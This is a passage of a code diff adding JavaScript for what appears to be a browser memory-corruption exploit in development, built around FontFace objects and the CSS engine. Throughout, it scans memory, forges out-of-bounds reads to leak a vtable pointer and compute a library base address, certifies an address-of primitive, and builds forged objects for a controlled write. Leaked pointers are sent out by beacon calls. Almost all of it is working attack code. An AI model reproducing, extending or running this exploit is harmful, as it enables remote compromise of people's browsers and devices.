+          if(MBUF===0n)try{localStorage.removeItem('v688_buf');}catch(e2){}
+        }catch(e){}
+        if(MBUF===0n){
+          var mFull=false;try{mFull=(localStorage.getItem('v688_mfull')==='1');}catch(e){}
+          var m2s=[];for(var mq=0x20;mq<=0xDB;mq++)m2s.push(mq);
+          m2s.sort(function(x,y){return Math.abs(x-mRef)-Math.abs(y-mRef);});
+          var m1s=[];for(var mq1=0;mq1<256;mq1++)m1s.push(mq1);
+          var m0s=mFull?[0,16,32,48,64,80,96,112,128,144,160,176,192,208,224,240]:[0];
+          bs('MSCAN-START-full='+(mFull?1:0)+'-n='+(m2s.length*m1s.length*m0s.length));
+          var mN=0;
+          for(var mi=0;mi<m2s.length&&MBUF===0n;mi++){
+            for(var mj=0;mj<m1s.length&&MBUF===0n;mj++){
+              for(var mk=0;mk<m0s.length;mk++){
+                var mc=BigInt(m0s[mk])|(BigInt(m1s[mj])<<8n)|(BigInt(m2s[mi])<<16n)|(BigInt(m4)<<32n);
+                mN++;
+                if(mPat(mc+0x90n)){
+                  if(mPat(mc+0xC0n)){MBUF=mc;break;}
+                }
+                if((mN%16384)===0)bs('MSCAN-'+mN);
+              }
+            }
+          }
+          if(MBUF===0n){
+            bs('MSCAN-CLEAN-n='+mN);
+            try{if(!mFull)localStorage.setItem('v688_mfull','1');}catch(e){}
+          }else{
+            bs('MBUF-0x'+MBUF.toString(16)+'-n='+mN);
+            try{localStorage.setItem('v688_buf',MBUF.toString(16));}catch(e){}
+          }
+        }
+
+        /* ==== V14 STEP 7.6: JSDataView cell scan (calibrated, pre-DEL) ====
+         * Semantics (device-decoded): chk(c)=T iff A<=c<=B; inverted => all-F.
+         * Cell windows: +0x14=(V.b4,0x40) PRIMARY; +0x1C=(0,0x20) SECONDARY;
+         * +0x18=(0x40,0) inverted all-F TERTIARY. +0x98 is planted
+         * dynamically from MBUF (boot-proof). Collect up to 4 candidates;
+         * Step 9 fully verifies each (header + 6 markers). */
+        var CELLC=[];
+        function cResp(a,cps){setR(a);var r=[];for(var ck=0;ck<cps.length;ck++)r.push(chk(cps[ck]));return r;}
+        function cTup(r){var s='';for(var ck2=0;ck2<r.length;ck2++)s+=(r[ck2]===null?'n':(r[ck2]?'T':'F'));return s;}
+        function cMatch(a,tup,cps){var r=cResp(a,cps);for(var ck3=0;ck3<4;ck3++){if(r[ck3]!==tup[ck3])return false;}return true;}
+        var P1CPS=null,SCPS=[0,0x1F,0x20,0x21],TCPS=[0x40,0x41,0,1];
+        var TA=null,TS=null,TT=null;
+        if(MBUF>0n){
+          /* dynamic plant: the +0x14 window = (band byte-4, 0x40) */
+          var b4v=Number((MBUF>>32n)&0xFFn);
+          var plantQ=(0x40n<<32n)|BigInt(b4v);
+          for(var pi=0;pi<__v688spray.length;pi++){try{dvSetBig(new DataView(__v688spray[pi]),0x98,plantQ);}catch(e5){}}
+          P1CPS=[(b4v>0?b4v-1:0),b4v,0x40,0x41];
+          TA=cResp(MBUF+0x98n,P1CPS);
+          bs('CALA-b4=0x'+b4v.toString(16)+'-'+cTup(TA));
+          var dA=(TA.indexOf(true)>=0)&&(TA.indexOf(false)>=0);
+          if(dA){
+            TS=cResp(MBUF+0xA8n,SCPS);
+            bs('CALS-'+cTup(TS));
+            TT=cResp(MBUF+0xA0n,TCPS);
+            bs('CALT-'+cTup(TT));
+            /* cached-cell try first */
+            try{
+              var cC=BigInt('0x'+(localStorage.getItem('v688_cell')||'0'));
+              if(cC>0x1000000000n&&cMatch(cC+0x14n,TA,P1CPS)&&cMatch(cC+0x1Cn,TS,SCPS)&&cMatch(cC+0x18n,TT,TCPS)){
+                CELLC.push(cC);bs('CELL-CACHED-0x'+cC.toString(16));
+              }
+              if(CELLC.length===0)try{localStorage.removeItem('v688_cell');}catch(e4){}
+            }catch(e){}
+            if(CELLC.length===0){
+              var cs2s=[];for(var cq=0x20;cq<=0xDB;cq++)cs2s.push(cq);
+              cs2s.sort(function(x,y){return Math.abs(x-mRef)-Math.abs(y-mRef);});
+              var cs1s=[];for(var cq1=0;cq1<256;cq1++)cs1s.push(cq1);
+              var cs0s=[0,16,32,48,64,80,96,112,128,144,160,176,192,208,224,240];
+              bs('CSCAN-START-n='+(cs2s.length*cs1s.length*cs0s.length));
+              var cN=0;
+              for(var ci=0;ci<cs2s.length&&CELLC.length<4;ci++){
+                for(var cj=0;cj<cs1s.length&&CELLC.length<4;cj++){
+                  for(var ck4=0;ck4<cs0s.length;ck4++){
+                    var cc=BigInt(cs0s[ck4])|(BigInt(cs1s[cj])<<8n)|(BigInt(cs2s[ci])<<16n)|(BigInt(m4)<<32n);
+                    cN++;
+                    if(cMatch(cc+0x14n,TA,P1CPS)&&cMatch(cc+0x1Cn,TS,SCPS)&&cMatch(cc+0x18n,TT,TCPS)){
+                      CELLC.push(cc);
+                      bs('CELLCAND-0x'+cc.toString(16)+'-n='+cN);
+                      if(CELLC.length>=4)break;
+                    }
+                    if((cN%16384)===0)bs('CSCAN-'+cN);
+                  }
+                }
+              }
+              if(CELLC.length===0)bs('CSCAN-CLEAN-n='+cN);
+              else bs('CSCAN-DONE-cands='+CELLC.length+'-n='+cN);
+            }
+          }else bs('CALA-WEAK');
+        }
+
+        /* --- style-read helpers --- */
+        function restoreAndForge(snap2,daddr,dlen){
+          for(var ib3=0;ib3<window.__sp.length;ib3++){
+            var vb3=window.__sp[ib3];if(!vb3)continue;
+            if(SKIPJ>=0&&ib3===SKIPJ)continue;
+            for(var dd2=0;dd2<SIZE;dd2++)vb3[dd2]=snap2[dd2];
+          }
+          forgeRead(daddr,dlen);
+        }
+
+        /* Remove face from document.fonts BEFORE forgeRead; face.style getter
+         * works without being in the font set and this prevents the layout
+         * engine from dereferencing our modified buffer fields between
+         * forgeRead and readStyle. */
+        bs('DEL-PRE-FORGE');
+        try{document.fonts.delete(faces[zi]);}catch(e){bs('DEL-ERR');}
+        bs('DEL-OK');
+
+        /* --- Immediate hash table read (selfFound=true, before bucket decay) --- */
+        var cachedHT='';
+        var preSnap=new Uint8Array(SIZE);
+        if(bufs.length>0)for(var ps0=0;ps0<SIZE;ps0++)preSnap[ps0]=bufs[0][0][ps0];
+        forgeRead(L1-0x10n,80);
+        try{cachedHT=dec(String(faces[zi].style),128);bs('IHT-ok-'+cachedHT.length);}catch(e){bs('IHT-err');}
+        for(var pr0=0;pr0<window.__sp.length;pr0++){var prv=window.__sp[pr0];if(!prv)continue;if(SKIPJ>=0&&pr0===SKIPJ)continue;for(var pr1=0;pr1<SIZE;pr1++)prv[pr1]=preSnap[pr1];}
+
+        /* --- Step 8: SYNCHRONOUS walk chain ---
+           After IHT, the CSS engine is "poisoned" — any yield point (setTimeout,
+           DOM write via b(), sync XHR via bs()) lets deferred C++ events fire and
+           crash the process. Solution: do ALL readStyle calls in one synchronous
+           JS execution frame with ZERO intermediate beacons or yields. */
+        var snap2=preSnap;
+        var hw='',h2='',h3='',h4='',h5='';
+        var IM=0n,FO=0n,VP=0n;
+        var S0=0n,S1=0n,S2=0n,S3=0n,Q4=0n,R5=0n,R6=0n,R7=0n,S8=0n;
+        var walkOK=false;
+        var raw4='',wt4='';
+
+        if(cachedHT.length>=160){
+          hw=cachedHT;
+
+          /* W1: parse hash table buckets from cached IHT data */
+          var seen=0;
+          for(var gb=2;gb<10;gb++){
+            var hb=hw.slice(gb*16,gb*16+16);
+            if(/^[0-9a-f]{16}$/.test(hb)){
+              var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
+              if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){if(seen===SI){IM=cv;break;}seen++;}
+            }
+          }
+
+          if(IM!==0n){
+            /* W2: read WeakPtrImpl+8 → m_ptr (client/CSSFontFaceSet*) — SYNC, no beacon */
+            restoreAndForge(snap2,IM+8n,16);
+            h2=readStyle();
+            var hf=h2.slice(0,16);
+            if(/^[0-9a-f]{16}$/.test(hf)){
+              FO=BigInt('0x'+hf.match(/../g).reverse().join(''));
+            }
+
+            if(FO>0x1000000000n){
+              /* W3: read client object → vtable pointer at +0x00 — SYNC */
+              restoreAndForge(snap2,FO,32);
+              h3=readStyle();
+              var hv=h3.slice(0,16),hz=h3.slice(32,48);
+              if(/^[0-9a-f]{16}$/.test(hv)){
+                VP=BigInt('0x'+hv.match(/../g).reverse().join(''));
+              }
+              if(/^[0-9a-f]{16}$/.test(hz)){
+                var s2=BigInt('0x'+hz.match(/../g).reverse().join(''));
+                if(s2>0x1000000000n&&s2<0x10000000000n)self=s2;
+              }
+
+              if(VP>0x100000000n){
+                /* YIELD: restore safe state, sync XHR to reset CSS engine tick budget */
+                for(var yr=0;yr<window.__sp.length;yr++){
+                  var yrv=window.__sp[yr];if(!yrv)continue;
+                  if(SKIPJ>=0&&yr===SKIPJ)continue;
+                  for(var yr2=0;yr2<SIZE;yr2++)yrv[yr2]=snap2[yr2];
+                }
+                bs('W3-MID');
+
+                /* W4: read ALL vtable slots 0-8 in one 72B read — after yield */
+                restoreAndForge(snap2,VP,72);
+                try{raw4=String(faces[zi].style);}catch(e){raw4='THROW:'+e.message;}
+                h4=dec(raw4,128);
+
+                /* also probe face.weight as alternative property */
+                try{wt4=String(faces[zi].weight);}catch(e){wt4='THROW';}
+
+                if(h4.length>=128){
+                  S0=readLeHex(h4,0);S1=readLeHex(h4,8);S2=readLeHex(h4,16);
+                  S3=readLeHex(h4,24);Q4=readLeHex(h4,32);R5=readLeHex(h4,40);
+                  R6=readLeHex(h4,48);R7=readLeHex(h4,56);S8=readLeHex(h4,64);
+                  walkOK=true;
+                } else {
+                  h5='raw4len='+raw4.length+',raw4='+raw4.slice(0,60);
+                }
+              }
+            }
+          }
+        }
+
+        /* Restore all buffers to safe state BEFORE any beacon */
+        for(var rr=0;rr<window.__sp.length;rr++){
+          var rrv=window.__sp[rr];if(!rrv)continue;
+          if(SKIPJ>=0&&rr===SKIPJ)continue;
+          for(var rr2=0;rr2<SIZE;rr2++)rrv[rr2]=snap2[rr2];
+        }
+
+        /* === NOW safe to beacon — all CSS reads are done === */
+        bs('WALK-hw0='+hw.slice(0,32));
+        bs('WALK-hw1='+hw.slice(32,80));
+        bs('WALK-hw2='+hw.slice(80,128));
+        bs('WALK-hw3='+hw.slice(128,160));
+        bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
+        bs('WALK-h2='+h2.slice(0,40));
+        bs('WALK-h3='+h3.slice(0,64));
+        bs('WALK-h4len='+h4.length+',raw4len='+raw4.length);
+        bs('WALK-raw4='+raw4.slice(0,60));
+        bs('WALK-wt4='+wt4.slice(0,60));
+        bs('WALK-h4='+h4.slice(0,80));
+        bs('WALK-h5='+h5.slice(0,80));
+        if(h4.length>=128)bs('WALK-VT='+h4.slice(0,144));
+        bs('WALK-ok='+walkOK);
+        if(VP>0n){
+          bs('VT-s0='+hex(S0)+',s1='+hex(S1)+',s2='+hex(S2));
+          bs('VT-s3='+hex(S3)+',s4='+hex(Q4)+',s5='+hex(R5));
+          bs('VT-s6='+hex(R6)+',s7='+hex(R7)+',s8='+hex(S8));
+        }
+
+        if(RTT){clearTimeout(RTT);RTT=0;}
+
+        if(!walkOK){
+          bs('WALK-FAIL');
+          verd('bad','WALK FAIL IM='+hex(IM)+' FO='+hex(FO)+' VP='+hex(VP));
+          return;
+        }
+
+        var SAFE=R6;
+
+        if(GT&&Q4===0n){
+          bs('RETRY-GT');
+          if(RT>0){setTimeout(function(){location.href=location.href.replace(/([?&])rt=\d+/,'$1rt='+(RT-1));},60);}
+          return;
+        }
+
+        /* ==== V688 STEP 9: Path B read-only identity + addrof certification ====
+         * Read-only. No vtable forge, no COOP trigger, no m_vector write, no
+         * promise-status writes, no executable-text reads. FO from the WALK is
+         * the IM client object — it is NOT relabelled FontFace. L2 is the
+         * source-derived reclaim-wrapper WeakImpl; FB=qword(L2+8) is only a
+         * source CANDIDATE for the FontFace backend until the identity gates
+         * below certify it. */
+        verd('ok','SELF='+hex(self)+'<br>VP='+hex(VP)+'<br>IM='+hex(IM));
+        setTimeout(function(){
+          if(VP===0n){bs('NOVP');return;}
+          var VP_RVA=0x724DB28n;
+          var BASE=VP-VP_RVA;
+          var PV=BASE+0x724DAC0n;
+          bs('PATHB-vp='+hex(VP)+'-base='+hex(BASE)+'-pv='+hex(PV)+' (source candidates)');
+          var cbq5=0n;   /* V11: JSC-side pointer from the callback wrapper */
+          var pxRawG=''; /* V16: the promise bytes, hoisted for the write test */
+          function readAt(a,len){restoreAndForge(snap2,a,len);return readStyle();}
+          function qAt(h,off){var s=h.slice(off*2,off*2+16);if(!/^[0-9a-f]{16}$/.test(s))return 0n;return BigInt('0x'+s.match(/../g).reverse().join(''));}
+          function canonHeap(p){return p>0x1000000000n&&p<0x10000000000n;}
+          function dumpQ(tag,h,maxB){var n=Math.min(Math.floor(h.length/16),Math.floor(maxB/8));for(var qi=0;qi<n;qi++){bs(tag+'-q'+qi+'=@'+qi*8+'='+hex(qAt(h,qi*8)));}}
+
+          /* --- bounded raw dump around L2 (reclaim wrapper weak impl) --- */
+          bs('L2RAW-PRE-addr='+hex(L2));
+          var l2raw=readAt(L2,64);
+          bs('L2RAW-OK-len='+l2raw.length);
+          dumpQ('L2RAW',l2raw,64);
+
+          /* --- read FB=qword(L2+8) with pre-read beacon --- */
+          bs('FB-PRE-addr='+hex(L2+8n));
+          var fbH=readAt(L2+8n,16);
+          var FB=qAt(fbH,0);
+          bs('FB='+hex(FB));
+          if(!canonHeap(FB)){
+            bs('FACE-IDENTITY-FAIL-FB-not-canonical-heap='+hex(FB));
+            bs('PATHB-STOP-implausible-FB');
+            verd('bad','FB implausible '+hex(FB));
+            return;
+          }
+
+          /* --- bounded <=96B read at FB; report every qword --- */
+          bs('FBRAW-PRE-addr='+hex(FB));
+          var fbRaw=readAt(FB,96);
+          bs('FBRAW-OK-len='+fbRaw.length);
+          dumpQ('FBRAW',fbRaw,96);
+
+          /* V10 REAL LAYOUT (measured on-device, NQ10G2): FontFace wrapper =
+           * { vtable=VP @+0x00, impl-backptr=L2 @+0x08, m_backing=self @+0x10,
+           *   ptr @+0x18, 0 @+0x20, epoch @+0x28, data @+0x30, string-tail }.
+           * The COOP_ANALYSIS.md source estimate (+0x20 secondary VP, +0x28
+           * weak state, +0x30 backing) was WRONG — corrected from evidence. */
+          var fbVtable=qAt(fbRaw,0x00);   /* +0x00 vtable — IS VP (walk-leaked) */
+          var fbWeak=qAt(fbRaw,0x08);     /* +0x08 back-pointer to L2 (mutual with impl+8) */
+          var fbBack=qAt(fbRaw,0x10);     /* +0x10 m_backing → SELF */
+          var fbP18=qAt(fbRaw,0x18);      /* +0x18 canonical-heap candidate (m_loadedPromise?) */
+          bs('FACE-vtable00='+hex(fbVtable)+'-expectVP='+hex(VP)+'-match='+(fbVtable===VP));
+          bs('FACE-weak08='+hex(fbWeak)+'-expectL2='+hex(L2)+'-match='+(fbWeak===L2));
+          bs('FACE-backing10='+hex(fbBack)+'-expectSelf='+hex(self)+'-match='+(fbBack===self));
+          bs('FACE-ptr18='+hex(fbP18)+'-canonHeap='+canonHeap(fbP18));
+          var idOK=(fbVtable===VP)&&(fbWeak===L2)&&(fbBack===self);
+          if(!idOK){
+            bs('FACE-IDENTITY-FAIL');
+            bs('PATHB-STOP-identity-gates-failed');
+            verd('bad','FACE-IDENTITY-FAIL');
+            return;
+          }
+          bs('FACE-IDENTITY-OK');
+
+          /* --- optional proxy inspection (only on certified identity) ---
+           * V10: m_loadedPromise candidate at +0x18 (real layout). */
+          var proxy=fbP18;
+                      bs('PROXY-candidate-FB+0x18='+hex(proxy)+' (measured-layout m_loadedPromise candidate, not p811 proof)');
+          if(!canonHeap(proxy)){
+            bs('PROXY-not-canonical-heap='+hex(proxy));
+            bs('PROMISE-CALLBACK-OWNER-FAIL-no-proxy');
+          }else{
+            bs('PROXYRAW-PRE-addr='+hex(proxy));
+            var pxRaw=readAt(proxy,96);
+            pxRawG=pxRaw;
+            bs('PROXYRAW-OK-len='+pxRaw.length);
+            dumpQ('PROXYRAW',pxRaw,96);
+            var cbWrap=qAt(pxRaw,0);
+            bs('PROXY-cbwrap='+hex(cbWrap));
+            var ownerOK=false;
+            if(canonHeap(cbWrap)){
+              bs('CBWRAP-PRE-addr='+hex(cbWrap));
+              var cbRaw=readAt(cbWrap,64);
+              bs('CBWRAP-OK-len='+cbRaw.length);
+              dumpQ('CBWRAP',cbRaw,64);
+              cbq5=qAt(cbRaw,40);   /* V11: JSC-side pointer candidate */
+              var cn=Math.min(Math.floor(cbRaw.length/16),8);
+              for(var ci=0;ci<cn;ci++){
+                if(qAt(cbRaw,ci*8)===FB){
+                  bs('PROMISE-CALLBACK-OWNER-OK-qindex='+ci+'-addr='+hex(cbWrap+BigInt(ci*8))+'-value='+hex(FB));
+                  ownerOK=true;break;
+                }
+              }
+              if(!ownerOK)bs('PROMISE-CALLBACK-OWNER-FAIL-no-exact-FB-in-callback-wrapper');
+            }else{
+              bs('PROXY-cbwrap-not-canonical-heap='+hex(cbWrap));
+              bs('PROMISE-CALLBACK-OWNER-FAIL-no-callback-wrapper');
+            }
+          }
+          /* Do NOT chase deferred-promise/JSC pointers without exact layouts. */
+
+          /* ==== V11: marker-buffer verification + JSC-region probe ==== */
+          if(MBUF>0n){
+            bs('MBUFVER-PRE-addr='+hex(MBUF));
+            var mvh=readAt(MBUF,32);
+            var me=qAt(mvh,0);
+            bs('MBUFVER-E='+hex(me)+'-match='+(me===0xDEADBEEFCAFEBABEn));
+            if(me===0xDEADBEEFCAFEBABEn){
+              bs('BUFVERIFIED');
+              bs('V11-BUF=0x'+MBUF.toString(16)+'-vector=0x'+(MBUF+0x20n).toString(16));
+            }else{
+              bs('BUFVERIFIED-FAIL');
+              try{localStorage.removeItem('v688_buf');}catch(e3){}
+            }
+          }else bs('MBUF-NOTFOUND');
+          if(cbq5>=0x1000000000n&&cbq5<0x1800000000n){ /* V57 FIX: cage-only - module text is read-fatal (V55-B/UOBOX8) */
+            var jp=(cbq5&~0xFn)-0x20n;
+            bs('JSCPROBE-PRE-addr='+hex(jp));
+            var jh=readAt(jp,128);
+            bs('JSCPROBE-OK-len='+jh.length);
+            dumpQ('JSCRAW',jh,128);
+          }else bs('JSCPROBE-SKIP-no-pointer');
+          /* ==== V11 END ==== */
+
+          // V39 RE-ENABLED in V51 — setup needed for COOP vars
+          // V39 Patch: SETUP ONLY (phases A+B skipped) [V52 FIX: stray unmatched wrapper { removed]
+
+/* ==== V39: WRITE FOOTPRINT + MULTI-SHOT ==== */
+
+try{
+  bs('V54-V39-PRECHK-MBUF='+(typeof MBUF==='undefined'?'UNDEF':MBUF.toString(16))+'-VP='+(typeof VP==='undefined'?'UNDEF':VP.toString(16))+'-bufs='+(typeof bufs==='undefined'?'UNDEF':bufs.length)+'-fbRaw='+(typeof fbRaw==='undefined'?'UNDEF':fbRaw.length)+'-l2raw='+(typeof l2raw==='undefined'?'UNDEF':l2raw.length));
+    if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&fbRaw.length>=128){
+    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
+    var mIdx=-1;
+    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
+    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
+    bs('V39-TAG-mIdx='+mIdx);
+
+    if(mIdx>=0&&mIdx<32){
+      var sv=new DataView(window.__v688.spray[mIdx]);
+      var S=MBUF;
+      var hitBuf=bufs[0][0];
+
+      /* ============================================================
+       *  PHASE A: SENTINEL WRITE FOOTPRINT
+       * ============================================================ */
+      bs('V39-PHASE-A-sentinel');
+
+      /* ---- STEP 1: ALL readAt FIRST ---- */
+      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
+      bs('V39-REAL-PROMISE-ADDR='+hex(promiseAddr));
+
+      var headH=readAt(FB-0x20n,0x48);
+      bs('V39-HEAD='+headH);
+
+      bs('V39-SIBLING-SCAN');
+      var sib=0n, sibBk=0n;
+      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
+        var q0h=readAt(sa,8);
+        if(qAt(q0h,0)===VP){
+          var bkH=readAt(sa+0x10n,8);
+          var bk=qAt(bkH,0);
+          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
+        }
+      }
+      if(sibBk===0n){bs('V39-NO-SIBLING');verd('err','V39 no sibling');throw 'no sibling';}
+      bs('V39-SIBLING='+hex(sib)+'-backing='+hex(sibBk));
+
+      var timerH=readAt(sibBk+0x88n,0x38);
+      bs('V39-TIMER-BORROWED='+timerH);
+
+      /* ---- STEP 2: build the FORGE ---- */
+      bs('V39-FORGE-BUILD');
+
+      /* impl: L2 byte-copy, m_ptr = C' = S+0x70 */
+      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
+      dvSetBig(sv,0x08,S+0x70n);
+      bs('V39-IMPL-rc='+sv.getUint32(0x00,true)+'-m_ptr='+hex(dvGetBig(sv,0x08)));
+
+      /* metadata + buckets (the proven 4-bucket ladder) */
+      sv.setUint32(0x20,0,true); sv.setUint32(0x24,1,true);
+      sv.setUint32(0x28,3,true); sv.setUint32(0x2C,4,true);
+      dvSetBig(sv,0x30,S); dvSetBig(sv,0x38,0n); dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
+
+      /* THE HEAD COPY: 0x48 bytes from [FB-0x20) -> S+0x50..0x98 */
+      for(var hc=0;hc<0x48;hc++)sv.setUint8(0x50+hc,parseInt(headH.substr(hc*2,2),16));
+      var headN=sv.getUint32(0x68,true);
+      var headVptr=dvGetBig(sv,0x70);
+      bs('V39-HEAD-rcN='+headN+'-vptr='+hex(headVptr));
+
+      /* aim promise at S+0xC0 */
+      var realPromiseCopied=dvGetBig(sv,0x88);
+      bs('V39-PROMISE-ORIG='+hex(realPromiseCopied)+'-aiming='+hex(S+0xC0n));
+      dvSetBig(sv,0x88,S+0xC0n);
+
+      /* **** THE V39 SENTINEL FILL ****
+       * Fill promise+0x00..+0x1F with 0x42 (sentinel).
+       * promise+0x20 MUST be 0x00 (the engaged flag — isFulfilled reads it).
+       * promise+0x21..+0x27 filled with 0x42 (padding after engaged).
+       * promise+0x28..+0x3F zeroed (deferred Vector — must be empty). */
+      for(var pf=0xC0;pf<0xE0;pf++)sv.setUint8(pf,0x42);   /* +0x00..+0x1F: sentinel */
+      sv.setUint8(0xE0,0x00);                                 /* +0x20: engaged=false (CRITICAL) */
+      for(var pp=0xE1;pp<0xE8;pp++)sv.setUint8(pp,0x42);     /* +0x21..+0x27: sentinel */
+      for(var pz=0xE8;pz<0x100;pz++)sv.setUint8(pz,0);       /* +0x28..+0x3F: zeroed Vector */
+
+      bs('V39-SENTINEL-FILL-done-0x42-at-C0-DF+E1-E7-zero-at-E0+E8-FF');
+
+      bs('V39-FORGE-BUILT');
+
+      /* V51: Skip Phase A+B tests — COOP vars are set up, jump to end */
+      bs('V54-COOP-SETUP-DONE-skipping-tests');
+      /* Restore table pointer so readAt works */
+      for(var rc=0;rc<8;rc++)hitBuf[0x58+rc]=Number((L1>>BigInt(rc*8))&0xFFn);
+
+      if(false){ /* V51: skip Phase A+B dispatch tests */
+
+      /* snapshot BEFORE the dispatch (byte-level) */
+      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0xC0,0x100));
+
+      /* ---- STEP 3: craft the FACE ---- */
+      bs('V39-FACE-CRAFT');
+      for(var sz=0x28;sz<=0x57;sz++)hitBuf[sz]=0;
+      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
+      hitBuf[0x82]=0; hitBuf[0x83]=1; hitBuf[0x87]=1;
+      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
+      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
+      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;
+      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;
+
+      /* ---- STEP 4: install ---- */
+      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);
+
+      /* ---- STEP 5: GATES ---- */
+      var gatesOK=true;
+
+      /* G1 metadata */
+      var g1hex='';for(var g1=0;g1<16;g1++)g1hex+=('0'+sv.getUint8(0x20+g1).toString(16)).slice(-2);
+      if(g1hex!=='00000000010000000300000004000000'){gatesOK=false;bs('V39-G1-FAIL');}
+      else bs('V39-G1-meta-OK');
+
+      /* G2 install */
+      var g2=0n;for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
+      if(g2!==(S+0x30n)){gatesOK=false;bs('V39-G2-FAIL');}else bs('V39-G2-install-OK');
+
+      /* G3/G4 counters+sources */
+      var g3ok=true,g4ok=true;
+      for(var g3=0x60;g3<0x68;g3++)if(hitBuf[g3]!==0)g3ok=false;
+      for(var g4=0x48;g4<0x58;g4++)if(hitBuf[g4]!==0)g4ok=false;
+      if(!g3ok||!g4ok){gatesOK=false;bs('V39-G3G4-FAIL');}else bs('V39-G3G4-zero-OK');
+
+      /* G5 status/timer */
+      var g5v=0n;for(var q9=0;q9<8;q9++)g5v|=BigInt(hitBuf[0x90+q9])<<BigInt(q9*8);
+      var g5t=0n;for(var q10=0;q10<8;q10++)g5t|=BigInt(hitBuf[0xB0+q10])<<BigInt(q10*8);
+      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1&&g5v!==0n&&g5t!==0n)){gatesOK=false;bs('V39-G5-FAIL');}
+      else bs('V39-G5-timer-OK');
+
+      /* GH: the head gates */
+      if(!(headN>=1)){gatesOK=false;bs('V39-GH-FAIL-rcN='+headN);}
+      else bs('V39-GH-rcN='+headN+'-OK');
+      var currentVptr=dvGetBig(sv,0x70);
+      if(currentVptr!==VP){gatesOK=false;bs('V39-GH-FAIL-vptr='+hex(currentVptr));}
+      else bs('V39-GH-vptr=REAL-VP-OK');
+
+      /* GI: impl.m_ptr */
+      if(dvGetBig(sv,0x08)!==(S+0x70n)){gatesOK=false;bs('V39-GI-FAIL');}
+      else bs('V39-GI-impl-mptr-OK');
+
+      /* GP: promise aimed + sentinel check */
+      var gPromise=dvGetBig(sv,0x88);
+      if(gPromise!==(S+0xC0n)){gatesOK=false;bs('V39-GP-FAIL-promise='+hex(gPromise));}
+      else bs('V39-GP-promise-aimed-OK');
+      if(sv.getUint8(0xC8)!==0x42){gatesOK=false;bs('V39-GP-FAIL-sentinel-C8');}
+      if(sv.getUint8(0xE0)!==0x00){gatesOK=false;bs('V39-GP-FAIL-engaged-not-zero');}
+      if(gatesOK)bs('V39-GP-sentinel-OK');
+
+      if(!gatesOK){
+        bs('V39-GATE-FAIL-ABORT-NO-LOAD');
+        verd('err','V39 gate fail');
+      }else{
+        bs('V39-GATES-ALL-OK');
+
+        /* ---- STEP 6: THE DISPATCH (Phase A) ---- */
+        bs('V39-A-LOAD-PRE');
+        var loadReturned=false;
+        try{
+          faces[zi].load();
+          loadReturned=true;
+          bs('V39-A-LOAD-RETURNED');
+        }catch(e){
+          bs('V39-A-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
+        }
+
+        /* ---- STEP 7: BYTE-LEVEL DIFF (the full write mask) ---- */
+        bs('V39-A-WIT-status='+hitBuf[0x82]+'-opcount='+(hitBuf[0x60]|(hitBuf[0x61]<<8))+'-rc-after='+sv.getUint32(0x68,true)+'-rc-before='+headN);
+
+        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0xC0,0x100));
+        var byteDiffs=[];
+        for(var bd=0;bd<0x28;bd++){
+          if(curA[bd]!==preA[bd]){
+            byteDiffs.push('+'+bd.toString(16).padStart(2,'0')+':'+preA[bd].toString(16).padStart(2,'0')+'>'+curA[bd].toString(16).padStart(2,'0'));
+          }
+        }
+
+        if(byteDiffs.length){
+          bs('V39-WRITE-MASK='+byteDiffs.join('|'));
+
+          /* Classify each offset range */
+          var codeWritten=false, padWritten=false, strWritten=false, hvWritten=false, hvPadWritten=false, engWritten=false;
+          for(var cd=0x08;cd<0x0C;cd++)if(curA[cd]!==preA[cd])codeWritten=true;
+          for(var pd=0x0C;pd<0x10;pd++)if(curA[pd]!==preA[pd])padWritten=true;
+          for(var sd=0x10;sd<0x18;sd++)if(curA[sd]!==preA[sd])strWritten=true;
+          if(curA[0x18]!==preA[0x18])hvWritten=true;
+          for(var hp=0x19;hp<0x20;hp++)if(curA[hp]!==preA[hp])hvPadWritten=true;
+          if(curA[0x20]!==preA[0x20])engWritten=true;
+
+          bs('V39-CLASS-code='+codeWritten+'-pad0C='+padWritten+'-string10='+strWritten+'-hasval18='+hvWritten+'-hvpad='+hvPadWritten+'-engaged20='+engWritten);
+
+          /* The key question: is +0x10 zeroed? */
+          var strVal=0n;
+          for(var sv10=0;sv10<8;sv10++)strVal|=BigInt(curA[0x10+sv10])<<BigInt(sv10*8);
+          bs('V39-STRING-FIELD-AT-10='+hex(strVal)+(strVal===0n?'-ZEROED-CONFIRMED':'-NONZERO'));
+
+          if(loadReturned){
+            bs('V39-A-COOP-WRITE-CONFIRMED');
+            verd('ok','V39-A footprint measured');
+          }
+        }else{
+          bs('V39-A-NO-DIFFS-in-promise-region');
+          if(!loadReturned)bs('V39-A-crashed-no-diffs');
+        }
+
+        /* Also dump the raw post-state of the promise region for full visibility */
+        var postHex='';
+        for(var ph=0;ph<0x28;ph++)postHex+=curA[ph].toString(16).padStart(2,'0');
+        bs('V39-A-POST-RAW='+postHex);
+
+        /* ============================================================
